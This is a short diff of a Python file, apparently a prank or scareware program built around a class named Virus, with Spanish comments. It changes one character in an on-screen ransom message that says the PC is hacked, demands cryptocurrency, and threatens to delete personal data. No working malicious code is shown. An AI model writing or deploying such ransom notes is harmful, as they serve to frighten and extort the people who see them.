@@ -80,7 +80,7 @@ class Virus:
 # frases que se mostraran en la interfas
 frase = "YOUR PC HAS BEEN HACKED"
 frase_2 = "IF YOU WANT YOUR PC AGAIN, SEND ME CRYPTOCURRENCY TO THIS ACOUNT" \
-          ": >>>KJFH242SIA333GIFGSDD2323FGSIFGSYF.\nDO NOT TURN OFF YOUR PC OR ALL PERSONAL INFORMATIO NWILL BE DELETE"
+          ": >>>KJFH242SIA333GIFGSDD232FGSIFGSYF.\nDO NOT TURN OFF YOUR PC OR ALL PERSONAL INFORMATIO NWILL BE DELETE"
 
 
 # se instancia la clase de virus y se le pasa como atributo las frases definidas anteriormente
